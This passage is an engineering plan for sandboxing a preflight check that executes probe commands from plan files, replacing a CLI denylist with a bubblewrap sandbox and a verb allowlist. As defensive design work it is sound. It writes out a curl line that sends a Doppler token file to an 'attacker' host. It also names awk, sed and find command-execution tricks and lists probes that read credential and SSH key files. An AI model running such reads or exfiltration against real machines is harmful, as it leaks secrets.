---
title: "fix: preflight Check 10 — sandbox the probe, replace the credentialed-CLI denylist with a probe-verb allowlist, and sanction declared-credentialed probes"
date: 2026-08-10
type: fix
issue: 7393
branch: feat-one-shot-7393-preflight-probe-verb-allowlist
lane: cross-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
plan_revision: v2 (post 4-agent review — v1's authority control was falsified by measurement)
---

# fix: preflight Check 10 — sandboxed execution + probe-verb allowlist + declared-credentialed path

Closes #7393.

## Enhancement Summary

**Deepened on:** 2026-08-10 · **Gates run:** 4.4 (precedent-diff), 4.6, 4.7, 4.8, 4.9, 4.10 — all pass
**Prior review:** 4-agent panel (kieran-rails-reviewer, architecture-strategist,
code-simplicity-reviewer, spec-flow-analyzer) drove the v1 → v2 redesign

### Key improvements from the deepen pass

1. **`--proc /proc` degradation (new AC 5b).** The precedent-diff gate surfaced
   `enableWeakerNestedSandbox` (#1557): `/proc` cannot be mounted in a nested user namespace.
   A hard `--proc` would have made the fail-closed design SKIP Check 10 in **every**
   containerized run — including the one-shot pipeline's own — while looking like correct
   operation. The runtime now retries once without `--proc`; measured to preserve the
   credential boundary and every probe class.
2. **Step 10.5 aligned to the repo's existing bwrap precedent** rather than invented, with a
   four-row side-by-side diff and an explicit rationale for each deliberate divergence
   (deny-by-default binds; SKIP-instead-of-refuse; unrestricted egress).
3. **Mount-ordering hazard independently corroborated.** The agent-sandbox module header
   documents the same tmpfs-shadows-earlier-binds semantics (#5733 / PR #5848) that was hit
   empirically during plan-time testing — two independent discoveries, so it belongs in the
   skill text.
4. **`fail-closed ≠ correct` Sharp Edge** generalized from finding 1.
5. **Citation sweep.** All 4 cited AGENTS rule IDs verified active (no retired-ID collisions);
   all 12 cited issue/PR numbers resolved live. `#7278` flipped `OPEN → CLOSED`
   *mid-session*, which is now recorded in the premise table as a worked example of
   `hr-before-asserting-github-issue-status`.

### New considerations discovered

- A gate whose failure mode is "skip" can be silently disabled by an environmental
  incompatibility unrelated to its threat model. Enumerate those environments explicitly.
- The strongest corroboration for a plan-time empirical finding is an unrelated part of the
  codebase having already paid for the same lesson.

## Overview

`/soleur:preflight` Check 10 parses `discoverability_test.command` out of a PR-linked plan
file and **executes it** on the operator's machine. Step 10.4 guards that execution with a
**denylist** of ten credentialed CLIs. The skill already concedes the denylist cannot be
complete, and #7393 supplies the motivating case: a probe whose verified property has **no
unauthenticated substitute** is rejected outright, with no sanctioned way to say so.

The fix is three layers, in strict priority order:

1. **Authority — execute inside a bubblewrap sandbox.** Repo bound read-only, `/home`,
   `/root` and `/run` replaced with tmpfs, resolver bound for DNS, `--unshare-all --share-net`.
   Fail-closed: if the sandbox cannot be established, **SKIP** — never fall back to
   unsandboxed execution.
2. **Legibility — a deny-by-default probe-verb allowlist** (11 verbs, derived from a measured
   632-command corpus) replacing the denylist, with arg rules that close inline-program
   equivalents.
3. **Declaration — `credentials_required`**, a single optional field. Present and
   non-placeholder ⇒ Check 10 **SKIPs without executing**, under its own distinct terminal
   (`SKIP-DECLARED`), with the reason surfaced verbatim.

### Why this plan is at v2 — the v1 control was falsified by measurement

v1 proposed an **ephemeral `$HOME`** as the authority control, with what looked like decisive
evidence: under `HOME=$(mktemp -d)` the Doppler token read `token_len=0` and `gh api user`
returned `DENIED`. Four-agent review challenged it, and the challenge was **correct**:

```
$ env -i PATH=/usr/local/bin:/usr/bin:/bin HOME=$(mktemp -d) \
    bash -c 'wc -c < /home/jean/.doppler/.doppler.yaml'
294
```

Ephemeral `$HOME` changes **where a CLI looks**, not **what is readable**. The real token file
is still readable at its absolute path by any allowlisted verb —
`curl --data-binary @/home/*/.doppler/.doppler.yaml https://attacker` carries no
shell-active token and passes every v1 gate. The v1 evidence measured *credential discovery*
and was presented as *credential reachability*: **the exact proxy-vs-invariant trap v1's own
Sharp Edge congratulated itself for escaping**, committed one section later. Two further v1
claims were falsified in the same pass — see §Research Reconciliation.

The measured control is a filesystem boundary, not an environment tweak. Verified on this
workstation (bubblewrap 0.11.1), same command inside the sandbox:

| Probe | v1 (ephemeral `$HOME`) | v2 (bwrap sandbox) |
| --- | --- | --- |
| `wc -c < /home/jean/.doppler/.doppler.yaml` | **294** (token readable) | `No such file or directory` |
| `cat /home/*/.doppler/.doppler.yaml` (glob) | readable | `No such file or directory` |
| `wc -c < /home/jean/.ssh/id_ed25519` | readable | `No such file or directory` |
| `awk 'BEGIN{system("wc -c < …doppler.yaml")}"` | **executes, reads token** | `cannot open` |
| `ls /run/user/1000/bus` (D-Bus → keyring) | reachable | `No such file or directory` |
| `echo x > .git/config` | **writes** | blocked (read-only bind) |
| `curl … https://soleur.ai/` | `200` | `200` |
| `dig +short soleur.ai` | resolves | resolves |
| `grep -c . AGENTS.md` | `110` | `110` |
| `node` / `python3` / `jq` / `bash <script>` | work | work |

## Premise Validation

| Premise cited by #7393 | Verified how | Verdict |
| --- | --- | --- |
| #7393 is open and unresolved | `gh issue view 7393` → `OPEN`, no closing PR | **Holds** |
| Check 10 Step 10.4 rejects via a credentialed-CLI denylist | Read `preflight/SKILL.md` Check 10 §Step 10.4 verbatim | **Holds** |
| The skill concedes the denylist is incomplete | Read the "**This is a DENYLIST…**" paragraph below the gate | **Holds** |
| `env -i` preserves `$HOME`, so on-disk creds stay reachable | Step 10.5 is `env -i … HOME="$HOME" … bash -c "$CMD"` | **Holds** |
| …and therefore scrubbing `$HOME` would fix it | **Measured — FALSE.** Absolute-path read returns the token (294 B) | **Falsified.** Drove the v1→v2 redesign |
| The trigger plan (registry/zot inventory lever) | `ls` → **absent on this branch**, as the brief warned | **Correctly out of scope.** No edit, fixture, or AC depends on it |
| #7278 (source deferral's parent) | `gh issue view 7278` → **`CLOSED`** (`closedAt=2026-08-10T10:29:01Z`) | Provenance only. It read `OPEN` earlier in this same planning session and closed mid-session — a live reminder that issue state is a read-at-use fact, not a plan-time constant (`hr-before-asserting-github-issue-status`). Nothing in this plan depends on it |

## Research Reconciliation — Spec vs. Codebase

| Claim (issue / v1 hypothesis) | Reality (measured) | Plan response |
| --- | --- | --- |
| Ephemeral `$HOME` removes ambient credentials | **False.** Absolute-path and glob reads return the live token; `awk 'BEGIN{system(…)}'` reaches it too. `env -i` scrubs *pointers*, not *files or sockets* | Layer 1 becomes a bwrap filesystem boundary. Ephemeral `$HOME` is retained only *inside* the sandbox, where it is redundant-but-harmless |
| A verb allowlist bounds what can execute | **Partly false.** `awk 'BEGIN{system("…")}'` executes arbitrary commands and passes the existing `SUBST_REJECT_RE` (no `;`, `&&`, `\|`, `$(`). Measured: printed `AWK-EXECUTED-ARBITRARY`. `find -exec … +` and GNU `sed -e '1e cmd'` are the same class | `awk`, `sed`, `find` are **excluded** from the allowlist and named as execution-equivalent to `bash -c`. Arg rules reject `-c`/`-e`/`--eval` on every allowlisted runtime |
| `bash <repo-tracked-path>` is safe because the script "passed the same PR review" | **Circular.** `git ls-files` interrogates the **PR-head index** — the attacker's own branch. Preflight runs *before* merge, so both plan and script are unreviewed at execution time | The tracked-path oracle is **dropped entirely** — it bought a false trust claim, a subprocess in a pure function, and a `./`-normalisation trap. Replaced by a pure string rule (no absolute path, no `..`); the sandbox is what actually contains the script |
| The allowlist named in #7393 is `curl, dig, getent, bun, bash` | Measured corpus (632 parseable Form-A commands): `curl` 142, `gh` 117, `cd` 97, `bash` 78, `doppler` 46, `grep` 26, vitest-path 22, `python3` 7, `git` 6, `bun` 6, `supabase` 5, `printf` 4, `rg`/`jq` 3. `dig`/`getent` appear **zero** times | Allowlist is 11 verbs from the measured corpus. `dig`/`getent` are **cut** — deny-by-default means the first author who needs one adds it in a one-line PR |
| Only the 10 denylisted CLIs are blocked today | `cd` (97) already trips Step 10.5's `&&` reject; `bun` and `./node_modules/.bin/vitest` (28) already fail **rc=127** because `PATH` is `/usr/local/bin:/usr/bin:/bin`. ~40% of declared probes cannot run today | `PATH` is **not** widened here (an authority grant inside a PR that narrows authority). The failure becomes *legible* instead of an opaque stdout mismatch. Corpus cleanup tracked separately |
| Check 10 and the reviewer agent agree on a valid probe | **They contradict.** `observability-coverage-reviewer.md` §Step 6 lists `gh api …`, `doppler secrets get …` as **"Acceptable shapes"** — on Check 10's reject list | Reviewer agent is a **required edit**: those shapes are acceptable only with a `credentials_required` declaration |
| Adding a schema field is safe w.r.t. the parity guard | `topLevelKeys()` is column-0-anchored, so a sub-field keeps the count at 5. **But** surface 3 asserts set-equality over the `required top-level fields (…)` **parenthetical** — adding a name there makes it 6 vs 5 and reddens | The field is a sub-field, and §4.7's mention goes **outside** the count phrase and parenthetical. A **new** extractor covers sub-field parity. `AGENTS.rules.md` stays byte-unchanged |
| Agent description budget target is ~2500 words | Measured **2847** — already 347 over | The reviewer edit is **body-only**; the AC asserts *unchanged*, not *under budget* |
| `AGENTS.rules.md` has room for a new rule | Measured `[WARN] B_ALWAYS=44400 >= 44000` against the 46000 ratchet — ~1600 B headroom | Retroactive justification for sub-fields. No rule added; both files byte-unchanged |

## Open Code-Review Overlap

**#4133** — `follow-through(#4116): Schema parity test for ## Observability block` (OPEN) names
`plan/SKILL.md`, `plan-issue-templates.md`, `deepen-plan/SKILL.md`. **Disposition: acknowledge.**
The test it tracks exists and is green (83/83); this plan strengthens it (sub-field parity) but
does not close #4133, whose criteria are its own. No other open `code-review` issue names a
file in scope.

## Problem

The invariant to preserve, stated precisely: **a plan author must not become an execution
oracle over the operator's ambient auth.** Today, three things defeat it:

1. **The denylist is unbounded-negative** — ten CLIs enumerated, every future vendor CLI
   permitted by default, indirect invocation uncovered.
2. **There is no sanctioned path for a legitimately-credentialed probe** — only FAIL (verify
   nothing) or rewrite to a weaker property (verify the wrong thing).
3. **The control is in the wrong layer entirely** — the probe runs with the whole filesystem
   readable and the worktree writable. Verb filtering in front of an open filesystem is not a
   boundary, and measurement proves it.

## Design Decision

### Layer 1 — Authority: bubblewrap sandbox (load-bearing)

Step 10.5's exec becomes, with **mount order load-bearing** (`--tmpfs /home` must precede the
repo bind, or it clobbers it — this cost one debugging cycle):

```text
RESOLV="$(readlink -f /etc/resolv.conf)"
bwrap --ro-bind /usr /usr --ro-bind /etc /etc \
      --symlink usr/bin /bin --symlink usr/lib /lib \
      --symlink usr/lib64 /lib64 --symlink usr/sbin /sbin \
      --tmpfs /home --tmpfs /root --tmpfs /run --tmpfs /tmp \
      --ro-bind "$RESOLV" "$RESOLV" \
      --ro-bind "$REPO_ROOT" "$REPO_ROOT" --chdir "$REPO_ROOT" \
      --proc /proc --dev /dev \
      --unshare-all --share-net --die-with-parent --new-session \
      /usr/bin/env -i PATH=/usr/local/bin:/usr/bin:/bin HOME=/tmp \
      timeout 15s bash -c "$CMD"
```

What each clause buys, measured: `--tmpfs /home` + `--tmpfs /root` remove every home-rooted
credential store *as files*, not merely as lookup targets — the absolute-path and glob reads
that defeat an ephemeral `$HOME` return `No such file or directory`. `--tmpfs /run` removes
`/run/user/<uid>/bus`, closing the D-Bus → Secret Service / gpg-agent / `StartTransientUnit`
class that survives `env -i` at a fixed discoverable path. `--ro-bind "$REPO_ROOT"` makes
`.git/hooks/pre-commit` and `.git/config` unwritable, closing the write-back escalation where a
probe installs a hook that `/soleur:ship` then executes seconds later **with the real `$HOME`**
— the escalation that made a several-second credential gap into a full compromise.
`--ro-bind "$RESOLV"` is required because `--tmpfs /run` otherwise removes
`/run/systemd/resolve/stub-resolv.conf`, which `/etc/resolv.conf` symlinks to; without it
`curl` fails rc=6 on every probe, which would have looked exactly like the #4148 DNS-typo
regression the check exists to catch.

**Fail-closed, no fallback.** If `bwrap` is absent, or the sandbox fails to establish (the
`kernel.apparmor_restrict_unprivileged_userns` drift class that broke the cron substrate in
#5000/#5004 — measured `= 1` on this host, with bwrap still functional), Check 10 returns
**SKIP** with a named reason. It **never** falls back to unsandboxed execution. A degraded
sandbox that silently reverts to the status quo would be worse than no sandbox, because the
skill text would claim a boundary that is not there.

**`--proc /proc` must degrade, not fail — deepen-plan precedent-diff finding.** The repo's own
agent sandbox carries `enableWeakerNestedSandbox: true` with the comment *"Docker containers
cannot mount /proc inside user namespaces (kernel restriction); this skips `--proc /proc` in
bwrap"* (`apps/web-platform/server/agent-runner-sandbox-config.ts`, #1557). Preflight runs
inside exactly such a context on the one-shot pipeline path. A hard `--proc /proc` would
therefore fail to establish the sandbox in every containerized/nested run and — because the
design is fail-closed — **silently SKIP Check 10 for all of them**, converting a security
improvement into a blanket disablement of the check. That failure mode would have looked like
the fail-closed design working correctly.

The runtime therefore attempts `--proc /proc` first and, on establishment failure, retries
**once** without it before giving up and SKIPping. Measured on this host: both forms keep the
credential boundary intact (`/home/$USER/.doppler/.doppler.yaml` → *no such file* in both) and
both run `curl` (200), `node`, `python3`, and `grep` — so the weaker form costs nothing the
probe classes need. This mirrors #1557's reasoning: `/proc` is not part of what the boundary
protects, so dropping it does not weaken the control.

**What this still does not close, named so no one cites Layer 1 as closure:** the probe retains
**network egress** (`--share-net`, required — `curl` is 142/632 probes), so an allowlisted verb
can still exfiltrate *repo contents* to an arbitrary host. The repo is public, so this is
bounded, but it is not zero. Egress filtering is out of scope and recorded in ADR-175
`## Consequences` as open.

### Layer 2 — Legibility and deny-by-default maintenance

The denylist is replaced by a closed set. The **effective verb** is the first
whitespace-delimited token of the dequoted command (`CMD_DEQ` — bash resolves `"doppler"`,
`\doppler`, `dopp""ler` to the same binary):

`curl` · `bash` · `sh` · `grep` · `rg` · `jq` · `python3` · `node` · `bun` · `printf` · `git`

Eleven verbs, each with ≥2 corpus uses. Arg rules:

- **`bash`/`sh`: reject `-c`.** An inline program defeats the allowlist in one token.
- **`python3`/`node`/`bun`: reject `-c`, `-e`, `--eval`, `-p`, `--print`** — the same
  inline-program class. v1 rejected `bash -c` while allowing `python3 -c`, which was incoherent.
- **A path-shaped first token** must be repo-relative — no leading `/`, no `..` segment.
  This admits the corpus's `scripts/betterstack-query.sh …` form and rejects
  `/usr/local/bin/gh`. It is a **pure string rule**: no `git ls-files` subprocess, so
  `rejectReason()` stays `string → string | null`, unit-testable with no fixtures, no
  filesystem, and no repo-state coupling.

**Explicitly excluded, with reasons** — `awk`, `sed`, `find` (measured execution-equivalent to
`bash -c`); `cd` (already dead via the `&&` reject); every vendor CLI, current and future
(the point of deny-by-default); `psql`, `docker`, `systemctl`, `journalctl`, `eval`, `env`,
`npm`, `claude`, `sentry-cli`, `cosign`.

**Every allowlist entry is an authority grant, and the skill text must say so.** Layer 1
contains what a verb can *reach*, but `curl` still has network egress and `bash <script>` still
has arbitrary in-sandbox code execution. Adding a verb therefore requires the same scrutiny as
an infra change — not a "legibility decision". The retired denylist's "do not describe this
reject as though it closed the class" instruction is **retargeted to both layers**, not deleted.

### Layer 3 — Declaration: `credentials_required` → `SKIP-DECLARED`

One optional sub-field of `discoverability_test`, holding `<scope> — <justification>`:

```yaml
discoverability_test:
  command: doppler run -p soleur -c prd_terraform -- scripts/betterstack-query.sh --since 24h --grep SOLEUR_ZOT_INVENTORY --limit 20
  expected_output: "≥1 row"
  credentials_required: "doppler:soleur/prd_terraform — Better Stack's query API has no unauthenticated form and the credentials live in Doppler prd_terraform; any unauthenticated rewrite verifies a strictly weaker property."
```

Present and non-placeholder ⇒ **SKIP without executing** (executing under Layer 1 would fail
for lack of credentials and say nothing about the property under test). Absent ⇒ normal path.
Placeholder (`TODO`/`TBD`/`N/A`/…) ⇒ **FAIL** via deepen-plan §4.7's *existing* placeholder
machinery — no new gate invented.

v1 used three fields (`requires_credentials` + `credentials_scope` +
`no_unauthenticated_substitute`) with a bespoke "ungated ⇒ FAIL" state. Collapsing to one
deletes that state, a fixture, two ACs, a test scenario, a failure mode, and two of three
parity keys — and loses nothing, because the plan already conceded the gate is defeatable by
writing a plausible sentence. Prose in a PR diff is exactly as reviewable as structured prose
in a PR diff.

**The residual risk is a gradient, not just a possibility — stated as review found it.** This
is the *cheapest path to non-FAIL* for any probe, for any reason, authored and validated by the
same agent at both gates in `/soleur:one-shot`. Left unwatched it converts Check 10 from a
verification gate into self-certification. Three mitigations, all mechanical:

1. Its own terminal, **`SKIP-DECLARED`**, never folded into ordinary `SKIP`, carrying the
   declared scope verbatim into the Phase 2 aggregate row.
2. A **committed baseline count** of `credentials_required:` across
   `knowledge-base/project/plans/` asserted in the suite, so every new adoption is a reviewable
   diff line rather than invisible drift.
3. Named in `observability-coverage-reviewer`'s checklist.

### Evaluation order

`ssh` reject → `credentials_required` (⇒ `SKIP-DECLARED`) → verb allowlist + arg rules →
shell-active-token reject → sandboxed execute. `ssh` stays first and is **not** overridable:
`hr-observability-as-plan-quality-gate` mandates a no-SSH probe unconditionally.

Review flagged the `credentials_required`-before-allowlist order as a "universal allowlist
bypass". It is a **verification waiver**, not an execution bypass — the declared path never
executes, so no verb reaches the sandbox. That distinction is real, but the waiver genuinely
does span *any* verb, which is why it is described that way above and mitigated by the three
mechanisms rather than by reordering.

### Research Insights — Sandbox Precedent Diff (deepen-plan Phase 4.4)

The repo is **not** new to bubblewrap. `git grep -l bwrap` returns an AppArmor profile
(`apps/web-platform/infra/apparmor-soleur-bwrap.profile`), a userns sysctl unit
(`bwrap-userns-sysctl.service`), a uid audit (`audit-bwrap-uid.sh`) and the agent sandbox
config. Per the precedent-diff gate, Step 10.5 is aligned to that precedent rather than
invented, and the three divergences are deliberate:

| Dimension | Canonical agent sandbox (`agent-runner-sandbox-config.ts`) | Check 10 Step 10.5 | Rationale for the divergence |
| --- | --- | --- | --- |
| Base filesystem posture | `--ro-bind / /` (**whole FS readable**), then per-sibling `--tmpfs` deny | **Deny-by-default**: bind only `/usr`, `/etc`, the resolver, and the repo | The agent legitimately reads the platform tree; a discoverability probe does not. Allow-by-default would re-open the absolute-path credential read that falsified v1 |
| Unavailable-dependency behaviour | `failIfUnavailable: true` — *"Without this flag the SDK silently runs unsandboxed… Tier 4 defense-in-depth disappears with no Sentry signal"* (#2634) | **SKIP**, never unsandboxed | Same principle, adapted: the agent path refuses to start; a preflight check has no session to refuse, so the honest terminal is SKIP with a named reason |
| Nested-userns `/proc` | `enableWeakerNestedSandbox: true` — skips `--proc /proc` (#1557) | Attempt with `--proc`, retry once without | **Adopted from the precedent.** Without it, Check 10 would SKIP in every containerized run |
| Network | `allowManagedDomainsOnly: true`, empty allowlist by default | `--share-net` (unrestricted) | `curl` is 142/632 probes and the endpoints are arbitrary. Recorded as open in ADR-175 `## Consequences`, not silently accepted |

The precedent also **independently corroborates the mount-ordering hazard** found empirically
here: the module header documents that the SDK's bwrap builder emits write-plane binds first
and `--tmpfs` last, so a broad `--tmpfs` *shadows* an earlier bind — the same ordering
semantics that made `--tmpfs /home` clobber the repo bind during plan-time testing (#5733,
PR #5848, "verified locally with bwrap 0.11.1"). Two independent discoveries of one rule is a
strong signal it belongs in the skill text, not only in a plan.

## Alternative Approaches Considered

| Alternative | Why not |
| --- | --- |
| **Ephemeral `$HOME`** (the v1 design) | Measured false: absolute-path/glob reads return the live token. Retained inside the sandbox as harmless defence-in-depth |
| **Don't execute untrusted content at all** — adopt ADR-074's Stage A pattern | The strongest option, and the reason Check 10 exists is that *static* gates produced "declared-verifiable but unverified" (#4148). Not executing returns us to that. Recorded in ADR-175 and defeated on that ground, not ignored |
| **Probe registry** — plan names a probe *id* resolving to a script tracked on `main`, args from a typed schema | Genuinely better long-term: deletes the whole parse → dequote → verb-extract → arg-rule surface, and `main`-tracked resolution fixes the PR-head trust circularity properly. Too large for this PR. Recorded in ADR-175 `## Consequences` with a tracking issue as the successor design |
| Allowlist only, no sandbox | Falsified — `awk 'BEGIN{system()}'` and absolute-path reads defeat it |
| Allowlist + static scan of wrapped scripts | Defeatable by `eval`/dynamic dispatch/second-level scripts. A scanner that *reads* complete while being incomplete is worse than an honest boundary |
| Keep the denylist, extend it | Unbounded-negative by construction. This is the defect |
| `bash` excluded entirely | Hard-blocks 78/632 probes, most uncredentialed, with no workaround |
| Scoped read-only token minted per check | Per-vendor minting paths; the token must live somewhere readable, **reintroducing ambient auth**; makes an advisory local gate a credential-issuing surface |
| Tracked-path oracle (`git ls-files`) | Circular — interrogates the attacker's own PR-head index before merge — plus symlink-blind and impure. Dropped |
| Widen `PATH` so `bun`/vitest probes run | An authority grant inside a PR that narrows authority. Tracked separately |
| Promote Check 10 to a hard merge gate | Explicitly one of #7393's *re-evaluate-when* triggers. Would turn ~40% already-unrunnable probes into merge blockers overnight |

## Files to Edit

**Runtime + contract:**

- `plugins/soleur/skills/preflight/SKILL.md` — Check 10 Step 10.4 (denylist → allowlist + arg
  rules + `credentials_required`), Step 10.5 (bwrap sandbox + fail-closed SKIP), Step 10.6
  (matrix 8 → 11 rows, new `SKIP-DECLARED` terminal), Steps 10.7/10.8 + Result block; **the
  global headless contract near line 19** (`On all PASS/SKIP: continue silently`) — which today
  would make `SKIP-DECLARED` invisible; **the Phase 2 aggregate table row**; and the two Sharp
  Edges asserting the denylist and the `env -i` limitation.
- `plugins/soleur/test/lib/discoverability-test-parser.ts` — delete `CRED_REJECT_RE`; add the
  allowlist, effective-verb extraction, arg rules, `parseCredentialsRequired()`; extend
  `rejectReason()` and `classifyDiscoverabilityResult()` with the `SKIP-DECLARED` terminal and
  the sandbox-unavailable SKIP.
- `plugins/soleur/skills/plan/references/plan-issue-templates.md` — three `## Observability`
  blocks, kept set-equal.
- `plugins/soleur/skills/plan/SKILL.md` §2.9 — canonical block comment + reject conditions.
- `plugins/soleur/skills/deepen-plan/SKILL.md` §4.7 Steps 3/5 — the allowlist check **and** the
  `credentials_required` handling, so a bad verb fails at authoring time, not ship time. The
  mention must sit **outside** the `the N required top-level fields (…)` count phrase and
  parenthetical, or surface 3 of the parity test reddens (6 vs 5).
- `plugins/soleur/skills/deepen-plan/workflows/deepen-plan.workflow.js` — halt string + STEP 1
  prose, hand-synced with §4.7.
- `plugins/soleur/agents/engineering/review/observability-coverage-reviewer.md` §Step 6 —
  **body-only** edit resolving the `gh`/`doppler` contradiction. Frontmatter `description:`
  untouched.

**Tests:**

- `plugins/soleur/test/preflight-discoverability-test.test.ts` — rewrite the **four** tests
  pinning denylist internals: `R2`, `R2b`, `R3`, and `Step 10.4 carries the credentialed-CLI
  reject`. That last one pins **three** assertions that all die under a first-token allowlist:
  `/\(doppler\|gh\|aws\|supabase\|stripe/`, `/\(\^\|\[\[:space:\]\]\|\/\)/`, and
  `/\[\[ "\$CMD_DEQ" =~ /`. Note the implementation constraint this imposes: `gateWindow()`
  resolves anchors only on lines matching `^if \[\[ "\$CMD` and returns `idx-6 … idx+4`, so the
  allowlist assignment must sit within 6 lines above a column-0 `if [[ "$CMD_DEQ" … ]]` — or
  `gateWindow()`'s anchor regex is generalized in the same PR. Add coverage for the allowlist,
  arg rules, `SKIP-DECLARED`, sandbox fail-closed, and the corpus baseline count.
- `plugins/soleur/test/observability-schema-parity.test.ts` — a **new** extractor for the
  indented children of `discoverability_test:` across canonical + the 3 template blocks. The
  existing top-level assertions stay untouched.

**Architecture model:**

- `knowledge-base/engineering/architecture/diagrams/model.c4` — the `contributor` actor's
  description. See §Architecture Decision for the direction-of-fit correction.

**Not edited, deliberately:** `plugins/soleur/skills/preflight/scripts/parse-form-a.awk`
(`credentials_required` is read with a flat sub-field `awk`, exactly as `expected_output`
already is — verified — keeping the awk/TS byte-exact parity harness untouched);
`AGENTS.md` / `AGENTS.rules.md` (sub-fields keep the `(5 fields)` count; ~1600 B headroom);
`views.c4` / `spec.c4`.

## Files to Create

- `plugins/soleur/test/fixtures/preflight-check-10/09-verb-not-allowlisted.md`
- `plugins/soleur/test/fixtures/preflight-check-10/10-credentials-required-skip.md`
- `knowledge-base/engineering/architecture/decisions/ADR-175-preflight-probe-execution-boundary.md`
  *(ordinal provisional — `ADR-171` is highest on `origin/main`; re-derive before merge)*

Only two fixtures: the arg-rule and path-rule cases are pure `rejectReason()` string calls
already covered by unit ACs, so markdown fixtures would add a parse round-trip that fixtures
01–08 already exercise. All fixtures synthesized per `cq-test-fixtures-synthesized-only`.

## Implementation Phases

Phase order corrects a v1 defect: v1 wrote the TS mirror (explicitly *non-authoritative*)
before the `SKILL.md` bash (authoritative), inverting the stated authority and making AC2
unsatisfiable until a later phase.

### Phase 0 — Preconditions (measure, do not assume)

1. Baseline: `bun test plugins/soleur/test/preflight-discoverability-test.test.ts
   plugins/soleur/test/observability-schema-parity.test.ts` → **83 pass, 0 fail**.
2. Sandbox capability + efficacy on the implementer's machine; paste output into the PR body.
   Assert the **invariant** (file unreachable), never an exit code:
   ```
   command -v bwrap && bwrap --version
   # inside the Step 10.5 sandbox, each MUST report "No such file or directory":
   #   wc -c < /home/$USER/.doppler/.doppler.yaml
   #   cat /home/*/.doppler/.doppler.yaml
   #   ls /run/user/$(id -u)/bus
   # and each MUST succeed: curl 200, dig resolves, grep -c . AGENTS.md
   ```
3. Confirm `readlink -f /etc/resolv.conf` and that binding it restores DNS — without it every
   `curl` probe fails rc=6, which is indistinguishable from the #4148 regression.

### Phase 1 — Runtime + mirror + tests together (RED → GREEN)

Contract and runtime land in one phase so no test asserts a contract that does not yet exist.
Per `cq-write-failing-tests-before`, tests first.

1. Failing tests: allowlisted verb accepted; non-allowlisted rejected with a reason naming
   **both** remedies; `bash -c`, `python3 -c`, `node -e`, `bun -e` rejected; `awk`/`sed`/`find`
   rejected; absolute and `..` paths rejected; `scripts/foo.sh` accepted; dequoting still
   applies; `credentials_required` ⇒ `SKIP-DECLARED` without executing; placeholder ⇒ FAIL;
   `ssh` + declaration ⇒ still FAIL; sandbox-unavailable ⇒ SKIP.
2. Implement Step 10.4 + Step 10.5 in `preflight/SKILL.md` (authoritative), then mirror in
   `discoverability-test-parser.ts`. Delete `CRED_REJECT_RE`.
3. Step 10.6 matrix → 11 rows with the `SKIP-DECLARED` terminal; **exactly one `**PASS**`**
   must remain (existing test invariant).
4. Steps 10.7/10.8, the Result block, the line-19 headless contract, and the Phase 2 aggregate
   row so `SKIP-DECLARED` is visible in headless and distinguishable from a path-gate SKIP.
   Never emit `$DT_STDOUT_SAFE` into a filed issue — the existing prohibition stands.
5. Rewrite the two Sharp Edges; retarget "do not describe this reject as though it closed the
   class" to both layers.
6. Add the two fixtures and the corpus baseline-count assertion.

### Phase 2 — Schema + doc surfaces

`plan/SKILL.md` §2.9 → `plan-issue-templates.md` (3 blocks) → `deepen-plan/SKILL.md` §4.7
(outside the count parenthetical) → `deepen-plan.workflow.js` → the reviewer agent's §Step 6.
Extend the parity test with the sub-field extractor.

### Phase 3 — ADR, C4, verification

1. ADR-175, recording the three defeated alternatives (no-execution/Stage-A pattern, probe
   registry, ephemeral `$HOME`) and the open consequences (network egress; PR-head trust).
   File the probe-registry tracking issue.
2. `model.c4` `contributor` description.
3. **Execution replay**, not a static tally: for the `bash <script>` corpus class (78 probes —
   the indirect-invocation class this change targets), run each inside and outside the sandbox
   and diff the verdicts. A static verb tally structurally cannot detect the sandbox regression
   class it exists to quantify. File one tracking issue per divergent plan.
4. `bash scripts/test-all.sh` (which runs `bun test plugins/soleur/`).

## Acceptance Criteria

### Pre-merge (PR)

1. In the Step 10.4 gate **window** (via the existing `gateWindow()` helper, never a whole-file
   grep — the retired denylist is legitimately named in surrounding prose, so a whole-file
   absence-grep false-fails): the denylist alternation is absent and `PROBE_VERB_ALLOWLIST` is
   present, with `CMD_DEQ` dequoting retained.
2. In the Step 10.5 exec-line window: `bwrap` is invoked with `--ro-bind "$REPO_ROOT"`,
   `--tmpfs /home`, `--tmpfs /run`, `--unshare-all`, and the resolver bind; and `--tmpfs /home`
   precedes the repo bind (mount order is load-bearing).
3. Sandbox efficacy, asserted as the invariant: inside the Step 10.5 sandbox,
   `wc -c < "$HOME/.doppler/.doppler.yaml"`, `cat /home/*/.doppler/.doppler.yaml`, and
   `ls /run/user/$(id -u)/bus` each report *no such file*; `echo x > .git/config` fails.
4. Sandbox does not break probes: inside it, `curl … https://soleur.ai/` returns `200`,
   `dig +short soleur.ai` is non-empty, `grep -c . AGENTS.md` matches the host value.
5. Fail-closed: with `bwrap` unavailable, `classifyDiscoverabilityResult` returns **SKIP** with
   a reason naming the sandbox — and the executor stub **throws if called**, proving no
   unsandboxed fallback.
5b. Nested-userns degradation: when `--proc /proc` cannot be mounted, the runtime retries
   **once** without it and still executes (it does **not** SKIP). Asserted two ways: the
   Step 10.5 window contains the retry-without-`--proc` branch, and a sandbox built without
   `--proc` still reports `curl` 200 **and** *no such file* for
   `/home/$USER/.doppler/.doppler.yaml`. Without this, Check 10 silently SKIPs in every
   containerized run — including the one-shot pipeline's own — which would read as the
   fail-closed design working correctly.
6. Inline-program rejects: `rejectReason` is non-null for each of `bash -c …`, `sh -c …`,
   `python3 -c …`, `node -e …`, `bun -e …`, `awk 'BEGIN{system("…")}'`, `sed -e '1e …'`,
   `find . -exec …`.
7. Path rules: `rejectReason('bash scripts/lint-workflows.sh --help')` is `null`;
   `rejectReason` is non-null for `bash /abs/x.sh`, `bash ../x.sh`, `/usr/local/bin/gh api user`.
   `rejectReason` remains a **pure synchronous** `string → string | null` with no subprocess.
8. Dequoting: `rejectReason('"doppler" secrets get X')` is non-null.
9. The not-allowlisted FAIL reason names **both** remedies — a repo-relative script, and
   `credentials_required` when genuinely credentialed — plus the allowlist-extension route.
10. `10-credentials-required-skip.md` classifies to **`SKIP-DECLARED`** with an executor that
    **throws if called**; the reason contains the declared scope verbatim.
11. Placeholder declaration (`credentials_required: TBD`) ⇒ **FAIL** via the existing §4.7
    placeholder machinery.
12. `ssh …` + a valid `credentials_required` ⇒ still **FAIL**.
13. `SKIP-DECLARED` is visible in headless mode and rendered distinctly from a path-gate SKIP in
    the Phase 2 aggregate row, carrying the declared scope.
14. Committed baseline count of `credentials_required:` across
